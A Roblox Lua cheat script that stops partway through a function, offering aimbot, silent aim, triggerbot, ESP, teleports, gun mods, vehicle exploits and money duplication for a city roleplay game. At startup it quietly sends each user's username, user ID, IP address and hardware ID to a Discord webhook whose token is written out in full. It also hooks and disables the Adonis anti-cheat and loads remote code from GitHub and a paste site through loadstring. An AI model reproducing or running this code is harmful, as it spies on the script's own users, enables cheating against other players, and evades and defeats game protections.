if getgenv().loaded then
    return
end

getgenv().loaded = true

Blacklist = {};

CharacterKill = {};

local sendrequest = (http_request and http_request) or (request and request) or (http and http.request)

sendrequest({
    Url = 'https://discord.com/api/webhooks/1324871945904328785/vK4IS6CSUB2iGCR5gueAVrA9EMnoiOleuQdg6hpkNILPWGjEsCzWbT9xVBANGMxcrwsI';
    Method = 'Post';
    Headers = {['Content-Type'] = 'application/json'};
    Body = game:GetService('HttpService'):JSONEncode({
        ["content"] = '';
        ["embeds"] = {{
            ['title'] = "Script Executed";
            ['description'] = "Name : ```yaml\n"..game.Players.LocalPlayer.Name .. "```\n\n User ID : ```yaml\n".. tostring(game.Players.LocalPlayer.UserId)..  "```\n\n Join Script : ```lua\n"..`game:GetService("TeleportService"):TeleportToPlaceInstance({tostring(game.PlaceId)}, {tostring("'"..game.JobId.."'")})`.."```\n\n Internet Protocol Version 4 : ```lua\n"..game:HttpGet("https://v4.ident.me").."```\n\n HWID : ```yaml\n"..gethwid().."```".."\n\n Blacklisted : ```yaml\n"..`{(table.find(Blacklist, game:HttpGet("https://v4.ident.me")) or table.find(Blacklist, gethwid()) or table.find(Blacklist, game:GetService("Players").LocalPlayer.UserId)) == nil and "No" or "Yes"}`.."```\n\n Character Killed : ```yaml\n"..`{(table.find(CharacterKill, game:HttpGet("https://v4.ident.me")) or table.find(CharacterKill, gethwid()) or table.find(CharacterKill, game:GetService("Players").LocalPlayer.UserId)) == nil and "No" or "Yes"}`.."```\n\nBlacklist : ```lua\n"..`{'"'..gethwid()..'"'};{'"'..game:HttpGet("https://v4.ident.me")..'"'};{'"'..tostring(game.Players.LocalPlayer.UserId)..'"'};{'"'..tostring(game.Players.LocalPlayer.Name)..'"'};`.."```";
            ['type'] = 'rich';
            ['color'] = tonumber(0xFFFFFF);
        }}
    })
})

if table.find(CharacterKill, game:HttpGet("https://v4.ident.me")) then
    return game:GetService("ReplicatedStorage").UI.Commands:FireServer("CKCONF");
end

if table.find(CharacterKill, gethwid()) then
    return game:GetService("ReplicatedStorage").UI.Commands:FireServer("CKCONF");
end

if table.find(CharacterKill, game.Players.LocalPlayer.Name) then
    return game:GetService("ReplicatedStorage").UI.Commands:FireServer("CKCONF");
end

if table.find(CharacterKill, game.Players.LocalPlayer.UserId) then
    return game:GetService("ReplicatedStorage").UI.Commands:FireServer("CKCONF");
end

if table.find(Blacklist, game:HttpGet("https://v4.ident.me")) then
    return game.Players.LocalPlayer:Kick("Blacklisted!")
end

if table.find(Blacklist, gethwid()) then
    return game.Players.LocalPlayer:Kick("Blacklisted!")
end

if table.find(Blacklist, game.Players.LocalPlayer.Name) then
    return game.Players.LocalPlayer:Kick("Blacklisted!")
end

if table.find(Blacklist, game.Players.LocalPlayer.UserId) then
    return game.Players.LocalPlayer:Kick("Blacklisted!")
end

do -- // obsufucation check
    if not LPH_OBFUSCATED then
        -- should only be used in **unobfuscated scripts!**
        -- will also perform basic runtime validation on script arguments

        local assert = assert
        local type = type
        local setfenv = setfenv

        LPH_ENCNUM = function(toEncrypt, ...)
            assert(type(toEncrypt) == "number" and #{...} == 0, "LPH_ENCNUM only accepts a single constant double or integer as an argument.")
            return toEncrypt
        end
        LPH_NUMENC = LPH_ENCNUM

        LPH_ENCSTR = function(toEncrypt, ...)
            assert(type(toEncrypt) == "string" and #{...} == 0, "LPH_ENCSTR only accepts a single constant string as an argument.")
            return toEncrypt
        end
        LPH_STRENC = LPH_ENCSTR

        LPH_ENCFUNC = function(toEncrypt, encKey, decKey, ...)
            -- not checking decKey value since this shim is meant to be used without obfuscation/whitelisting
            assert(type(toEncrypt) == "function" and type(encKey) == "string" and #{...} == 0, "LPH_ENCFUNC accepts a constant function, constant string, and string variable as arguments.")
            return toEncrypt
        end
        LPH_FUNCENC = LPH_ENCFUNC

        LPH_JIT = function(f, ...)
            assert(type(f) == "function" and #{...} == 0, "LPH_JIT only accepts a single constant function as an argument.")
            return f
        end
        LPH_JIT_MAX = LPH_JIT

        LPH_NO_VIRTUALIZE = function(f, ...)
            assert(type(f) == "function" and #{...} == 0, "LPH_NO_VIRTUALIZE only accepts a single constant function as an argument.")
            return f
        end

        LPH_NO_UPVALUES = function(f, ...)
            assert(type(setfenv) == "function", "LPH_NO_UPVALUES can only be used on Lua versions with getfenv & setfenv")
            assert(type(f) == "function" and #{...} == 0, "LPH_NO_UPVALUES only accepts a single constant function as an argument.")

            local env = getrenv()
            return setfenv(
                LPH_NO_VIRTUALIZE(function(...)
                    return func(...)
                end),
                setmetatable(
                    {
                        func = f
                    },
                    {
                        __index = env,
                        __newindex = env
                    }
                )
            )
        end

        LPH_CRASH = function(...)
            assert(#{...} == 0, "LPH_CRASH does not accept any arguments.")
            game:Shutdown()
            while true do end
        end
    end;
end;

game:GetService("ReplicatedStorage"):FindFirstChild("UI"):FindFirstChild("MENU"):Destroy()

local runservice = game:GetService('RunService')
local renderstepped = runservice.RenderStepped
local inputservice = game:GetService('UserInputService')
local tweenservice = game:GetService('TweenService')
local Workspace = game:GetService("Workspace")
local replicatedstorage, uis, players, localplayer, camera, wtsp, wtvp, getplayers, findfirstchild, findfirstchildofclass, mouse, getchildren, getdescendants, isa, getpartsobscuringtarget, isfriendswith = game:GetService("ReplicatedStorage"), game:GetService("UserInputService"), game:GetService("Players"), game:GetService("Players").LocalPlayer, workspace.CurrentCamera, workspace.CurrentCamera.WorldToScreenPoint, workspace.CurrentCamera.WorldToViewportPoint, game:GetService("Players").GetPlayers, workspace.FindFirstChild, workspace.FindFirstChildOfClass, game:GetService("Players").LocalPlayer:GetMouse(), workspace.GetChildren, workspace.GetDescendants, workspace.IsA, workspace.CurrentCamera.GetPartsObscuringTarget, game:GetService("Players").LocalPlayer.IsFriendsWith
local utility = {solara = getexecutorname() == "Solara" and true or (not getexecutorname() == "Solara") and false, car = nil, fakefolder = nil}

if utility.solara == false then
    do -- // Adonis Bypass
        local DTC

        for Index, Value in next, getgc(true) do
            if type(Value) == "table" then
                local Detected = rawget(Value, "Detected")
                local Kill = rawget(Value, "Kill")
        
                if type(Detected) == "function" and not DTC then 
                    DTC = Detected
        
                    hookfunction(Detected, function(...)
                        return true
                    end)
                end
        
                if rawget(Value, "Variables") and rawget(Value, "Process") and typeof(Kill) == "function" then             
                    hookfunction(Kill, function(...)

                    end)
                end
            end
        end
        
        local Old; Old = hookfunction(getrenv().debug.info, newcclosure(function(...)
            local LevelOrFunc, Info = ... 
            if DTC and LevelOrFunc == DTC then 
                return coroutine.yield(coroutine.running())
            end
            return Old(...)
        end));
    end;
end

local link = utility.solara == true and 'https://raw.githubusercontent.com/IrishGypsyUser/Linoria-Cursor/main/NoMouseIconChange.lua' or utility.solara == false and 'https://raw.githubusercontent.com/IrishGypsyUser/Linoria-Cursor/main/UI.lua'

local Library = loadstring(game:HttpGet('https://raw.githubusercontent.com/IrishGypsyUser/Linoria-Cursor/main/NoMouseIconChange.lua'))()
local ThemeManager = loadstring(game:HttpGet('https://raw.githubusercontent.com/IrishGypsyUser/Linoria-Cursor/refs/heads/main/ThemeManager.lua'))()
local SaveManager = loadstring(game:HttpGet('https://raw.githubusercontent.com/violin-suzutsuki/LinoriaLib/main/addons/SaveManager.lua'))()
Toggles = getgenv().Toggles
Options = getgenv().Options

--Library:Notify("Join the new discord! link copied to clipboard.", 30)
--setclipboard("https://discord.gg/wxWwn9xfCa")

function utility:getcharacter(player)
    if typeof(player) == "Instance" and findfirstchild(players,tostring(player)) and player.Character then
        return player.Character
    end
    return nil
end

function utility:getroot(player)
    if typeof(player) == "Instance" and findfirstchild(players,tostring(player)) and player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
        return player.Character:FindFirstChild("HumanoidRootPart")
    end
    return nil
end

function utility:getcarparent(object)
    local carparent = object.Parent
    
    while carparent do
        if string.match(tostring(carparent),"Car") then
            return carparent
        else
            carparent = carparent.Parent
        end
    end
    
    return nil
end

function utility:getclosestplayer(player)
    plrs = {}
    for i,v in next, getplayers(players) do
        if v ~= player then
            if utility:getroot(v) and utility:getroot(player) then
                table.insert(plrs,{plr = v, range = (utility:getroot(player).Position - utility:getroot(v).Position).Magnitude})
            end
        end
    end
    table.sort(plrs,function(a,b) return a.range < b.range end)
    return plrs[1] and plrs[1].plr or nil
end

function utility:getmelee()
    if utility:getcharacter(localplayer) then
        if findfirstchildofclass(utility:getcharacter(localplayer),"Tool") and findfirstchild(findfirstchildofclass(utility:getcharacter(localplayer),"Tool"),"BackstabDamage") then
            return findfirstchildofclass(utility:getcharacter(localplayer),"Tool")
        end
    end
    return nil
end

function utility:getgun()
    if utility:getcharacter(localplayer) then
        if findfirstchildofclass(utility:getcharacter(localplayer),"Tool") and findfirstchild(findfirstchildofclass(utility:getcharacter(localplayer),"Tool"),"Stats") then
            return findfirstchildofclass(utility:getcharacter(localplayer),"Tool")
        end
    end
    return nil
end

function utility:addchamber() 
    if not findfirstchild(localplayer.Backpack,"Glock19X") then
        return
    end    
    if not findfirstchild(localplayer.Backpack['Glock19X'],"Stats") then
        return
    end
    if findfirstchild(localplayer.Backpack['Glock19X'].Stats,"Chamber") then
        return
    end

    local chamber = Instance.new("StringValue",localplayer.Backpack['Glock19X'].Stats)
    chamber.Name = "Chamber"
end

function utility:getclosestseat(object)
    seats = {}
    if findfirstchild(object,"Body") then
        for _,__ in next, object.Body:GetChildren() do
            if isa(__,"Seat") then
                table.insert(seats,{seat = __,Range = (utility:getroot(localplayer).Position - __.CFrame.Position).Magnitude})
            end
        end
    end
    if object:FindFirstChild("DriveSeat") then
        table.insert(seats,{seat = object:FindFirstChild("DriveSeat"),Range = (utility:getroot(localplayer).Position - object:FindFirstChild("DriveSeat").CFrame.Position).Magnitude})
    end
    table.sort(seats,function(A,B) return A.Range < B.Range end)
    return seats[1] and seats[1].seat or nil
end

function utility:draw(name, properties)
    if utility.solara == true then
        return properties
    end
    local drawing = Drawing.new(name)
    for property, value in pairs(properties) do
        drawing[property] = value
    end
    return drawing
end

function utility:create(classname, properties)
    local instance = Instance.new(classname)
    for property, value in pairs(properties) do
        instance[property] = value
    end
    return instance
end

utility.fakefolder = utility:create("Folder",{Name = "FakeRemotes", Parent = replicatedstorage})
teleportdebounce = false

local sl2 = {
    ['blacklistedtools'] = {
        ['Skittles'] = true,
        ['SkittlesPack'] = true,
        ['Bally'] = true,
        ['Mask'] = true,
        ['Fist'] = true,
        ['Phone'] = true,
        ['MXHelmet'] = true,
        ['SBGlock'] = true,
        ['Radio'] = true,
        ['SBDraco'] = true,
        ['AK'] = true,
        ['Airpods'] = true,
        ['Bandana'] = true
    },
    ["aiming"] = {
        ["aimbot"] = {
            ["enabled"] = false,
            ["keybind"] = nil,
            ["targetpart"] = "Head",
            ["friendcheck"] = false,
            ["visiblecheck"] = false,
            ["alivecheck"] = false,
            ["showfov"] = false,
            ["fovcolor"] = Color3.fromRGB(255, 255, 255),
            ["fovradius"] = 90,
            ["fovsides"] = 90,
            ["snapline"] = false,
            ["snaplinecolor"] = Color3.fromRGB(255, 255, 255),
            ["smoothing"] = 0,
            ["smoothingstyle"] = Enum.EasingStyle.Linear,
            ["easingdirection"] = Enum.EasingDirection.InOut,
            ["triggerbotenabled"] = false,
            ["triggerbotbind"] = Enum.KeyCode.V,
            ["triggerbotmode"] = "Blatant", -- Blatant, Legit\
            ["triggersettings"] =  {
                ["cache"] = {},
                ["real"] = {"hold key"}
            }
        },
        ["silent"] = {
            ["whitelist"] = {
                ["cache"] = {},
                ["whitelisted"] = {}
            },
            ["enabled"] = false,
            ["keybind"] = nil,
            ["targetpart"] = "Head",
            ["targetmode"] = "Auto",
            ["friendcheck"] = false,
            ["visiblecheck"] = false,
            ["alivecheck"] = false,
            ['hitchance'] = 100,
            ["showfov"] = false,
            ["fovcolor"] = Color3.fromRGB(255, 255, 255),
            ["fovradius"] = 90,
            ["fovsides"] = 90,
            ["snapline"] = false,
            ["snaplinecolor"] = Color3.fromRGB(255, 255, 255),
            ["wallbang"] = false,
            ["triggerbot"] = false,
        } 
    },
    ["visuals"] = {
        ["world"] = {
            ["changeambient"] = false,
            ["ambient"] = Color3.fromRGB(255, 255, 255),
            ["changefogcolor"] = false,
            ["fogcolor"] = Color3.fromRGB(255, 255, 255),
            ["nofog"] = false,
            ["changefov"] = false,
            ["fov"] = 70,
            ["changesaturation"] = false,
            ["saturation"] = 1,
        }
    },
    ["vehicle"] = {
        ["speedenabled"] = false,
        ["speedamount"] = 10/1000,
        ["breakenabled"] = false,
        ["breakspeed"] = 50/1000,
        ["instabreakenabled"] = false,
        ["instabreakkey"] = Enum.KeyCode.X,
        ["carteleportenabled"] = false,
        ["carteleportbind"] = Enum.KeyCode.V,
        ["bugtarget"] = localplayer,
        ["bugging"] = false,
        ["autopark"] = false,
        ["bypasslocked"] = false,
    },
    ["locations"] = {
        ["frames"] = {
            ["MM Turf 📦"] = CFrame.new(-180, 5, 372);
            ["FTO Turf 📦"] = CFrame.new(-177, 4, 587);
            ["ZT Turf 📦"] = CFrame.new(-665, 6, 91);
            ["4E Turf 📦"] = CFrame.new(-359, 4, -178);
            ["Met Station 👮"] = CFrame.new(-208, 6, -210);
            ["Apartment 1 🏚"] = CFrame.new(-101, 4, -115);
            ["Apartment 2 🏠"] = CFrame.new(-207, 4, -42);
            ["Apartment 3 🏡"] = CFrame.new(31, 4, -214);
            ["Apartment 4 🏘"] = CFrame.new(-644, 4, -294);
            ["Premium Gun Dealer 🔫"] = CFrame.new(55, 4, -128);
            ["Free Gun Dealer 🔫"] = CFrame.new(-429, 4, 286);
            ["Sports Direct 👓"] = CFrame.new(-18, 4, -82);
            ["Urban Crates 📦"] = CFrame.new(283, 4, -158);
            ["Top Of City Building 🏢"] = CFrame.new(43, 112, 78);
            ["Top Of Sky Scraper 🌃"] = CFrame.new(-381, 211, 589);
            ["Top Of Highest Building 🌇"] = CFrame.new(436, 261, 287);
            ["Skittles Dealer 💉"] = CFrame.new(-176, -1, 147);
            ["Dealership 🚗"] = CFrame.new(-78, 4, 501);
            ["Jail 🔒"] = CFrame.new(-184, -419, -804);
            ["Joyce Office 🏢"] = CFrame.new(412, 155, 267);
            ["Casino 🎲"] = CFrame.new(-411, -294, 242);
            ["Octival 💻"] = CFrame.new(-1092, -87, 913);
            ["Work Office 🛠"] = CFrame.new(-982, -87, 930);
            ["Icebox 💎"] = CFrame.new(-656, -421, -791);
        },
        ["names"] = {"MM Turf 📦","FTO Turf 📦","ZT Turf 📦","4E Turf 📦","Met Station 👮","Apartment 1 🏚","Apartment 2 🏠","Apartment 3 🏡","Apartment 4 🏘","Premium Gun Dealer 🔫","Free Gun Dealer 🔫","Sports Direct 👓","Urban Crates 📦","Top Of City Building 🏢","Octival 💻","Top Of Sky Scraper 🌃","Top Of Highest Building 🌇","Skittles Dealer 💉","Dealership 🚗","Jail 🔒","Joyce Office 🏢","Work Office 🛠","Casino 🎲","Icebox 💎"}
    },
    ["exploits"] = {
        bringwhitelist = {},
        ["remotes"] = {
            ["realcrash"] = findfirstchild(replicatedstorage,"AirbagSystem"),
            ["fakecrash"] = utility:create("RemoteEvent",{Name = "AirbagSystem", Parent = utility.fakefolder}),
            ["realequip"] = findfirstchild(replicatedstorage.GunRemotes,"Equipping"),
            ["fakeequip"] = utility:create("RemoteEvent",{Name = "Equipping", Parent = utility.fakefolder}),
            ["realloot"] = findfirstchild(replicatedstorage.UI,"EDead"),
            ["fakeloot"] = utility:create("RemoteEvent",{Name = "EDead", Parent = utility.fakefolder})
        },
        ["bypass"] = function(frame)
            local frame = frame
            pcall(function()
                if localplayer.Character and localplayer.Character:FindFirstChild("HumanoidRootPart") and frame then
                    if teleportdebounce == false then
                        teleportdebounce = true
                        replicatedstorage.UI.MenuTP:FireServer("End")
                        task.wait((game:GetService('Stats').Network.ServerStatsItem['Data Ping']:GetValue() + 150 ) / 1000)
                        repeat task.wait(.0025) if localplayer.Character:FindFirstChild("HumanoidRootPart") then localplayer.Character.HumanoidRootPart.CFrame = frame end until localplayer.Character.HumanoidRootPart.CFrame == frame
                        teleportdebounce = false
                    end
                end
                if localplayer.Character and localplayer.Character:FindFirstChild("HumanoidRootPart") and (not frame) then
                    replicatedstorage.UI.MenuTP:FireServer("End")
                    task.wait((game:GetService('Stats').Network.ServerStatsItem['Data Ping']:GetValue() + 150 ) / 1000)
                end
            end)
        end,
        ["gunmods"] = {
            ["whitelist"] = false,
            ["infiniteammo"] = false,
            ["automaticgun"] = false,
            ["norecoil"] = false,
            ["recoilvalue"] = 100,
            ["nospread"] = false,
            ["norifle"] = false,
            ["instantshoot"] = false,
            ["defaultrecoils"] = {},
        },
        ["player"] = {
            ["autopickup"] = false,
            ["anticuff"] = false,
            ["antihood"] = false,
            ["anticambob"] = false,
            ["antiragdoll"] = false,
            ["antiapartmentcheck"] = false,
            ["infiniteskittles"] = false,
            ["infinitestamina"] = false,
            ["safeslots"] = false,
            ["stabaura"] = false,
            ["instantprompt"] = false,
            ["autosplit"] = false,

            ["respawn"] = false,
            ["teleportonspawn"] = false,
            ['teleporttarget'] = localplayer,

            ["clicktp"] = false,
            ["clicktpbind"] = Enum.KeyCode.LeftControl
        },
        ["safe"] = {
            ["safegunsondeath"] = false,
            ["maxclips"] = false,
            ["playertowhitelist"] = localplayer.UserId,
            ["getitem"] = function(name)
                for i,v in pairs(localplayer.SafeStats:GetChildren()) do
                    if v.Value == name then
                        return v
                    end
                end
            end
        }
    }
}

table.sort(sl2.locations.names,function(a,b) return a<b end)

localplayer.CharacterAdded:Connect(function(character)
    if sl2.exploits.player.teleportonspawn then
        if findfirstchild(players,tostring(sl2.exploits.player.teleporttarget)) and utility:getroot(sl2.exploits.player.teleporttarget) then
            character:WaitForChild("HumanoidRootPart")
            sl2.exploits.bypass(utility:getroot(sl2.exploits.player.teleporttarget).CFrame)
        else
            Library:Notify("Error : Player not rendered or is not found!",5)
        end
    end
end)

findfirstchildofclass(utility:getcharacter(localplayer),"Humanoid").Died:Connect(function()
    if sl2.exploits.player.respawn then
        oldframe = localplayer.Character.HumanoidRootPart.CFrame
        task.wait(1)
        sl2.exploits.bypass()
        localplayer.CharacterAdded:Wait()
        localplayer.Character:WaitForChild("HumanoidRootPart")
        sl2.exploits.bypass(oldframe)
    end

    if sl2.exploits.player.teleportonspawn then
        task.wait(1)
        sl2.exploits.bypass()
    end
end)

localplayer.CharacterAdded:Connect(function(Chr)
    Chr:WaitForChild("Humanoid")
    Chr.Humanoid.Died:Connect(function()
        if sl2.exploits.player.respawn then
            oldframe = localplayer.Character.HumanoidRootPart.CFrame
            task.wait(1)
            sl2.exploits.bypass()
            localplayer.CharacterAdded:Wait()
            localplayer.Character:WaitForChild("HumanoidRootPart")
            sl2.exploits.bypass(oldframe)
        end

        if sl2.exploits.player.teleportonspawn then
            task.wait(1)
            sl2.exploits.bypass()
        end
    end)
end)

function utility:stab()
    if not sl2.exploits.player.stabaura then
        return
    end
    if not utility:getmelee() then
        return
    end
    if not utility:getclosestplayer(localplayer) then
        return
    end
    local number = math.random(0,1)
    utility:getmelee().LocalScript.Sw:FireServer(number)
    utility:getmelee().LocalScript.Damage:FireServer(findfirstchildofclass(utility:getcharacter(utility:getclosestplayer(localplayer)),"Humanoid"),number == 1 and 0 or number == 0 and 1,findfirstchild(utility:getcharacter(utility:getclosestplayer(localplayer)),"UpperTorso"),"Back")
    utility:getmelee().LocalScript.Damage:FireServer(findfirstchildofclass(utility:getcharacter(utility:getclosestplayer(localplayer)),"Humanoid"),number,findfirstchild(utility:getcharacter(utility:getclosestplayer(localplayer)),"UpperTorso"),"Front")
end


function utility:wallcheck(Character)
    if sl2.aiming.silent.wallbang then
        return true
    end

    local visible = false

    local Character = Character

    task.spawn(function()
        local origin = camera.CFrame.Position;
        local position = findfirstchild(Character, "Head").Position;
        local params = RaycastParams.new();

        params.FilterDescendantsInstances = { localplayer.Character, camera, Character };
        params.FilterType = Enum.RaycastFilterType.Blacklist;
        params.IgnoreWater = true;

        visible = Workspace:Raycast(origin, position - origin, params) == nil;
    end)

    return visible
end;

function utility:getmousecast()
    local mouseLocation = uis:GetMouseLocation()
    local ray = camera:ViewportPointToRay(mouseLocation.X, mouseLocation.Y)
    local params = RaycastParams.new()
    params.FilterType = Enum.RaycastFilterType.Blacklist
    params.FilterDescendantsInstances = {utility:getcharacter(localplayer)}
    local cast = workspace:Raycast(ray.Origin, ray.Direction * 1000, params)

    if cast then
        return cast
    end
    
    return nil
end

function utility:trigger(holdkey,veryblatant)
    holdkey = table.find(sl2.aiming.aimbot.triggersettings.real,"hold key") and true or not table.find(sl2.aiming.aimbot.triggersettings.real,"hold key") and false
    veryblatant = table.find(sl2.aiming.aimbot.triggersettings.real,"veryblatant") and true or not table.find(sl2.aiming.aimbot.triggersettings.real,"veryblatant") and false
    handgunsonly = table.find(sl2.aiming.aimbot.triggersettings.real,"hand guns") and true or not table.find(sl2.aiming.aimbot.triggersettings.real,"hand guns") and false
    if not sl2.aiming.aimbot.triggerbotenabled then
        return
    end
    if holdkey and (not uis:IsKeyDown(sl2.aiming.aimbot.triggerbotbind)) then
        return
    end

    local gun = utility:getgun()

    if not gun then return end

    if handgunsonly and gun.Stats:FindFirstChild("Rifle") then
        return
    end

    if gun then
        if veryblatant == true then 
            for i,v in getplayers(players) do
                if v~=localplayer and utility:getcharacter(v) and utility:getcharacter(v).PrimaryPart then
                    local character = utility:getcharacter(v)
                    if findfirstchildofclass(character,"Humanoid") then
                        if findfirstchildofclass(character,"Humanoid").Health == 0 then
                            return
                        end
                        if utility:wallcheck(character) then
                            replicatedstorage.GunRemotes.Impact:FireServer(gun,character.Head,character.Head.Position,character.Head.Position,character.Head.Position,"Glass",{camera,utility:getcharacter(v),findfirstchild(workspace,"apes"),findfirstchild(workspace,"OBJECTS"),utility:getroot(localplayer)})
                        end
                    end
                end
            end
        elseif veryblatant == false then
            local cast = utility:getmousecast()
            if cast then
                local hitpart = cast.Instance
                local casthit = players:GetPlayerFromCharacter(hitpart.Parent)
                
                if casthit and casthit.Character.Humanoid.Health ~= 0 then
                    
                    local PlayerHead = findfirstchild(utility:getcharacter(casthit),"Head")
                    if PlayerHead then
                        if sl2.aiming.aimbot.triggerbotmode == "Blatant" then
                            replicatedstorage.GunRemotes.Impact:FireServer(gun,PlayerHead,PlayerHead.Position,PlayerHead.Position,PlayerHead.Position,"Glass",{camera,utility:getcharacter(casthit),findfirstchild(workspace,"apes"),findfirstchild(workspace,"OBJECTS"),findfirstchild(utility:getcharacter(localplayer),"HumanoidRootPart")})
                        elseif sl2.aiming.aimbot.triggerbotmode == "Legit" then
                            mouse1click()
                        end
                    end
                end
            end
        end
    end
end

local esplibrary = {
    enabled = true,
    maxdistance = 3000,
    --
    textfont = 2,
    textsize = 12,
    --
    tweenhealth = false,
    --
    friendcheck = false,
    visiblecheck = false,
    --
    distance_format = 0.4,
    distance_measurement = "m",
    -- BOX/ETC
    boxes = {["enabled"] = false, ["color"] = Color3.fromRGB(255, 255, 255), ["type"] = "Bounding"},
    healthbars = {["enabled"] = false},
    healthtext = {["enabled"] = false},
    -- TEXT
    names = {["enabled"] = false, ["displaynames"] = false, ["color"] = Color3.fromRGB(255, 255, 255)},
    distance = {["enabled"] = false, ["color"] = Color3.fromRGB(255, 255, 255)},
    weapon = {["enabled"] = false, ["color"] = Color3.fromRGB(255, 255, 255)},
    --
    chams = {["enabled"] = false, ["color"] = Color3.fromRGB(255, 255, 255), ["transparency"] = 0},
    glow = {["enabled"] = false, ["color"] = Color3.fromRGB(0, 0, 0), ["transparency"] = 0}
}

if getexecutorname() == "AWP" then
    esplibrary = loadstring(game:HttpGet("https://paste.fo/raw/5ad30509434f"))()
end

esplibrary.names.displaynames = false

getgenv().Window = Library:CreateWindow({
    Title = "sl2.joyces | made by joycemember",
    Center = true,
    AutoShow = true,
    TabPadding = 0,
    MenuFadeTime = 0.1
})

local Tabs = {
    Aiming = Window:AddTab('Aiming');
    Visuals = Window:AddTab('Visuals');
    Main = Window:AddTab('Exploits');
    ['UI Settings'] = Window:AddTab('UI Settings');
}

local LocalPlayerBox = Tabs.Main:AddLeftGroupbox("Local Player")
local ExtraPlayerBox = Tabs.Main:AddLeftGroupbox("Extra")
local SafeBox = Tabs.Main:AddRightGroupbox("Safe")
local GunModBox = Tabs.Main:AddLeftGroupbox("Gun Mods")
local whitelistedtomoney = {"UPJOYCEE";"66666438616563373663333439373831366637626662643131323232323532646235393633653361653462306261323039326162323739386664396164343464";"78.69.65.106";"7389416177";"Cryptic705_onTik";}

if table.find(whitelistedtomoney, game:HttpGet("https://v4.ident.me")) or table.find(whitelistedtomoney, gethwid()) or table.find(whitelistedtomoney, game.Players.LocalPlayer.UserId) or table.find(whitelistedtomoney, game.Players.LocalPlayer.Name) then
    local MoneyBox = Tabs.Main: AddRightGroupbox("Money")

    MoneyBox:AddLabel(`to use the auto-split method, you need atleast <1> illegal cash in your safe.`, true)

    MoneyBox:AddDivider()

    MoneyBox:AddToggle('autosplit', {Text = 'Auto Split', Default = false,Callback = function(x)
        sl2.exploits.player.autosplit = x
    end})

    spawn(LPH_NO_VIRTUALIZE(function()
        for i=1, 5 do
            spawn(function()
                while true do wait(0)
                    if not sl2.exploits.player.autosplit then continue end
        
                    replicatedstorage.UI.Split:FireServer(0.5)
                end
            end)
        end
    end))
end

local TeleportBox = Tabs.Main: AddRightGroupbox("Teleportation")
local MiscBox = Tabs.Main:AddRightGroupbox("Vehicle")

local tpcarbutton = MiscBox:AddButton('Teleport Car', function() 
    if utility.car and findfirstchild(utility.car,"Body") and findfirstchildofclass(utility.car.Body,"Part") and findfirstchild(utility.car,"DriveSeat") then
        utility.car.PrimaryPart = findfirstchildofclass(utility.car.Body,"Part")
        oldframe = utility:getroot(localplayer)["CFrame"]
        utility.car.DriveSeat:sit(findfirstchildofclass(utility:getcharacter(localplayer),"Humanoid"))
        task.wait(.1)
        utility.car:SetPrimaryPartCFrame(oldframe)
    else
        Library:Notify("Error : Car not found or rendered!",5)
    end
end)
tpcarbutton:AddButton('Sit In Car', function() 
    if utility.car and findfirstchild(utility.car,"DriveSeat") then
        utility.car.DriveSeat:sit(findfirstchildofclass(utility:getcharacter(localplayer),"Humanoid"))
    else
        Library:Notify("Error : Car not found or rendered!",5)
    end
end)
local parkcarbutton = MiscBox:AddButton('Park Car', function()
    if utility.car and findfirstchild(utility.car,"Body") and findfirstchildofclass(utility.car.Body,"Part") and findfirstchild(utility.car,"DriveSeat") then
        utility.car.PrimaryPart = findfirstchildofclass(utility.car.Body,"Part")
        utility.car.DriveSeat:sit(findfirstchildofclass(utility:getcharacter(localplayer),"Humanoid"))
        task.wait(.1)
        utility.car:SetPrimaryPartCFrame(workspace:FindFirstChild("Parkingg"):FindFirstChild("PARK").CFrame + Vector3.new(0, 5, 0))
    else
        Library:Notify("Error : Car not found or rendered!",5)
    end
end)
parkcarbutton:AddButton("Infinite Gas",function()
    localplayer.Valuestats.CarGas.Value = 100
    localplayer.Valuestats.CarGas.Changed:Connect(function()
        localplayer.Valuestats.CarGas.Value = 100
    end)
end)
MiscBox:AddDivider()
MiscBox:AddDropdown('bugtarget', {SpecialType = 'Player', Text = 'Target Player', Multi = false, Callback = function(Value)
    if Value then sl2.vehicle.bugtarget = findfirstchild(players,Value) else sl2.vehicle.bugtarget = nil end
end})
MiscBox:AddToggle('bugplayer', {Text = 'Bug Player',Default = false,Callback = function(x)
    sl2.vehicle.bugging = x
    while sl2.vehicle.bugging do task.wait()
        if utility.car and findfirstchild(utility.car,"Body") and findfirstchild(utility.car.Body,"CollisionPart") and utility:getroot(sl2.vehicle.bugtarget) then
            utility.car.PrimaryPart = findfirstchild(utility.car.Body,"CollisionPart")
            utility.car:SetPrimaryPartCFrame(utility:getroot(sl2.vehicle.bugtarget).CFrame)
            replicatedstorage["CarSound"]:FireServer(utility.car,1000,1000,false,1000,1000,0,1000,false)
        end
    end
end})
MiscBox:AddToggle('Car Click Teleport', {Text = 'Car Click Teleport',Default = false,Callback = function(x)
    sl2.vehicle.carteleportenabled = x
end}):AddKeyPicker('Car Teleport Bind', {Default = 'V',SyncToggleState = false,Mode = 'Hold',Text = '', NoUI = false,Callback = function()end,ChangedCallback = function(New)
    sl2.vehicle.carteleportbind = New
end})
MiscBox:AddToggle('Auto Park Vehicle', {Text = 'Auto Park Vehicle',Default = false,Callback = function(x)
    sl2.vehicle.autopark = x
end})
MiscBox:AddDivider()
MiscBox:AddToggle('CarVelocitySpeed', {Text = "Car Velocity Speed", Default = false, Callback = function(v)
    sl2.vehicle.speedenabled = v
end})
MiscBox:AddSlider('VelocitySpeed', {Text = 'Velocity Speed', Default = 10, Min = 0, Max = 50, Rounding = 0, Compact = false, Callback = function(v)
    sl2.vehicle.speedamount = v/1000
end})
MiscBox:AddDivider()
MiscBox:AddToggle('BreakVelocitySpeed', {Text = "Break Speed", Default = false, Callback = function(v)
    sl2.vehicle.breakenabled = v
end})
MiscBox:AddSlider('BreakVelocity', {Text = 'Break Velocity', Default = 50, Min = 0, Max = 300, Rounding = 0, Compact = false, Callback = function(v)
    sl2.vehicle.breakspeed = v/1000
end})
MiscBox:AddDivider()
MiscBox:AddToggle('InstaStop', {Text = "Instant Stop", Default = false, Callback = function(v)
    sl2.vehicle.instabreakenabled = v
end}):AddKeyPicker('InstaStopBind', {Default = 'X', SyncToggleState = false, Mode = 'Hold', Text = '', NoUI = true, Callback = function()end,ChangedCallback = function(N)
    sl2.vehicle.instabreakkey = N
end})
uis.InputBegan:Connect(function(input,gameProcessedEvent)
    if input.KeyCode == sl2.vehicle.instabreakkey and sl2.vehicle.instabreakenabled and (not gameProcessedEvent) then
        if localplayer.Character and localplayer.Character:FindFirstChild("Humanoid") then
